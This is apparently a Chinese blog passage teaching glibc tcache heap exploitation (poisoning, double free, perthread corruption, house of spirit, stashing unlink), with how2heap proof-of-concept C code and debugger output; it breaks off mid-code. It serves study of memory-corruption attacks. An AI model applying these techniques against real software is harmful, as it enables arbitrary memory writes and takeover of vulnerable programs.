    <content type="html"><![CDATA[<p>tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。对 tcache 的深入认识去<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache-zh/#tcache">这里</a>。这里主要记录一下如何 PWN tcache。<a id="more"></a></p><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>即 tcache 污染，通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。以 how2heap 中的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">tcache_poisoning</a> 为例，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"</span></span><br><span class="line">   <span class="string">"returning a pointer to an arbitrary location (in this case, the stack).\n"</span></span><br><span class="line">   <span class="string">"The attack is very similar to fastbin corruption attack.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"</span></span><br><span class="line">   <span class="string">"We have to create and free one more chunk for padding before fd pointer hijacking.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating 2 buffers.\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Freeing the buffers...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"</span></span><br><span class="line">   <span class="string">"to point to the location to control (%p).\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p ].\n"</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2nd malloc(128): %p\n"</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入如下：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">glibc_2.26 [master●] ./tcache_poisoning </span><br><span class="line">This file demonstrates a<span class="built_in"> simple </span>tcache poisoning attack by tricking malloc into</span><br><span class="line">returning a pointer <span class="keyword">to</span> an arbitrary location (<span class="keyword">in</span> this case, the stack).</span><br><span class="line">The attack is very similar <span class="keyword">to</span> fastbin corruption attack.</span><br><span class="line"></span><br><span class="line">The<span class="built_in"> address </span>we want malloc() <span class="keyword">to</span> return is 0x7fff0d28a0c8.</span><br><span class="line">Allocating 1 buffer.</span><br><span class="line">malloc(128): 0x55f666ee1260</span><br><span class="line">Freeing the buffer<span class="built_in">..</span>.</span><br><span class="line">Now the tcache list has [ 0x55f666ee1260 ].</span><br><span class="line">We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55f666ee1260</span><br><span class="line"><span class="keyword">to</span> point <span class="keyword">to</span> the location <span class="keyword">to</span> control (0x7fff0d28a0c8).</span><br><span class="line">1st malloc(128): 0x55f666ee1260</span><br><span class="line">Now the tcache list has [ 0x7fff0d28a0c8 ].</span><br><span class="line">2st malloc(128): 0x7fff0d28a0c8</span><br><span class="line">We got the control</span><br></pre></td></tr></table></figure><p>从代码的逻辑可以看出其漏洞利用与 fastbin 的攻击方式是一样的，都是通过更改<code>fd</code>指针指向我们控制的地址，但因为没有 size 的限制有了更大的利用范围。</p><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h3><p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p><p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p><p>以 how2heap 中的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">tcache_dup</a> 为例，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating buffer.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing twice...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p ].\n"</span>, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Next allocated buffers will be same: [ %p, %p ].\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次 free 时，申请的 chunk 被放入 tcache_entry 中：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heapinfo</span><br><span class="line"><span class="number">3886144</span></span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555756270</span> (size : <span class="number">0x20d90</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x20</span>)   tcache_entry[<span class="number">0</span>]: <span class="number">0x555555756260</span></span><br></pre></td></tr></table></figure><p>第二次 free 时，虽然 free 的是同一个 chunk，但因为 <code>tcache_put()</code> 没有做任何检查，因此程序不会 crash，而 tcache_entry 中会再添加该 chunk 的地址：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heapinfo</span><br><span class="line"><span class="number">3886144</span></span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555756270</span> (size : <span class="number">0x20d90</span>) </span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x20</span>)   tcache_entry[<span class="number">0</span>]: <span class="number">0x555555756260</span> --&gt; <span class="number">0x555555756260</span> (overlap chunk with <span class="number">0x555555756250</span>(freed) )</span><br></pre></td></tr></table></figure><h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>我们已经知道 <code>tcache_perthread_struct</code> 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。</p><p>设想有如下的堆排布情况：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">tcache_    +------------+</span><br><span class="line">\perthread |<span class="string">......      </span>|</span><br><span class="line">\_struct   +------------+</span><br><span class="line">           |<span class="string">counts[i]   </span>|</span><br><span class="line">           +------------+</span><br><span class="line">           |<span class="string">......      </span>|<span class="string">          +----------+</span></span><br><span class="line"><span class="string">           +------------+          </span>|<span class="string">header    </span>|</span><br><span class="line">           |<span class="string">entries[i]  </span>|<span class="string">---------&gt;+----------+</span></span><br><span class="line"><span class="string">           +------------+          </span>|<span class="string">NULL      </span>|</span><br><span class="line">           |<span class="string">......      </span>|<span class="string">          +----------+</span></span><br><span class="line"><span class="string">           </span>|<span class="string">            </span>|<span class="string">          </span>|<span class="string">          </span>|</span><br><span class="line">           +------------+          +----------+</span><br></pre></td></tr></table></figure><p>通过一些手段（如 <code>tcache posioning</code>），我们将其改为了：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">tcache_    +<span class="params">------------</span>+&lt;<span class="params">---------------------------</span>+</span><br><span class="line">\perthread |<span class="string">......</span>      |                            |</span><br><span class="line">\_struct   +<span class="params">------------</span>+                            |</span><br><span class="line">           |counts[i]   |                            |</span><br><span class="line">           +<span class="params">------------</span>+                            |</span><br><span class="line">           |<span class="string">......</span>      |          +<span class="params">----------</span>+      |</span><br><span class="line">           +<span class="params">------------</span>+          |header    |      |</span><br><span class="line">           |entries[i]  |<span class="params">---------</span>&gt;+<span class="params">----------</span>+      |</span><br><span class="line">           +<span class="params">------------</span>+          |target    |<span class="params">------</span>+</span><br><span class="line">           |<span class="string">......</span>      |          +<span class="params">----------</span>+</span><br><span class="line">           |            |          |          |</span><br><span class="line">           +<span class="params">------------</span>+          +<span class="params">----------</span>+</span><br></pre></td></tr></table></figure><p>这样，两次 malloc 后我们就返回了 <code>tcache_prethread_struct</code> 的地址，就可以控制整个 tcache 了。因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</p><h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h3><p>与 fastbin 中的 house of spirit 一样，该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>拿 how2heap 的源码来讲：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack on tcache.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Ok. Let's start with the example!.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region contains one fake chunk. It's size field is placed at %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line"></span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的 chunk，然后去 free 掉他，我们会发现：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x4052e0</span> (size : <span class="number">0x20d20</span>)</span><br><span class="line">       last_remainder: <span class="number">0x0</span> (size : <span class="number">0x0</span>)</span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)   tcache_entry[<span class="number">7</span>]: <span class="number">0x7fffffffe510</span> --&gt; <span class="number">0x401340</span></span><br></pre></td></tr></table></figure><p>Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。</p><h3 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h3><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p><h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h3><p>这种攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 <code>calloc</code> 分配同大小堆块触发，因为 <code>calloc</code> 分配堆块时不从 tcache bin 中选取)。在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc 地址 (类似 <code>unsorted bin attack</code> 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p><p>我们按照释放的先后顺序称 <code>smallbin[sz]</code> 中的两个 chunk 分别为 chunk0 和 chunk1。我们修改 chunk1 的 <code>bk</code> 为 <code>fake_chunk_addr</code>。同时还要在 <code>fake_chunk_addr-&gt;bk</code> 处提前写一个可写地址 <code>writable_addr</code> 。调用 <code>calloc(size-0x10)</code> 的时候会返回给用户 chunk0 (这是因为 smallbin 的 <code>FIFO</code> 分配机制)，假设 <code>tcache[sz]</code> 中有 5 个空闲堆块，则有足够的位置容纳 <code>chunk1</code> 以及 <code>fake_chunk</code> 。在源码的检查中，只对第一个 chunk 的链表完整性做了检测 <code>__glibc_unlikely (bck-&gt;fd != victim)</code> ，后续堆块在放入过程中并没有检测。</p><p>因为 tcache 的分配机制是 <code>LIFO</code> ，所以位于 <code>fake_chunk-&gt;bk</code> 指针处的 <code>fake_chunk</code> 在链入 tcache 的时候反而会放到链表表头。在下一次调用 <code>malloc(sz-0x10)</code> 时会返回 <code>fake_chunk+0x10</code> 给用户，同时，由于 <code>bin-&gt;bk = bck;bck-&gt;fd = bin;</code> 的 unlink 操作，会使得 <code>writable_addr+0x10</code> 处被写入一个 libc 地址。</p><p>这里以 <code>how2heap</code> 中的 <code>tcache_stashing_unlink_attack</code> 为例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the stashing unlink attack on tcache.\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Stack_var emulates the fake chunk we want to alloc to.\n\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"First let's write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can see the value of fake_chunk-&gt;bk is:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we alloc 9 chunks with malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 tcache</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">//&gt;0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n"</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span 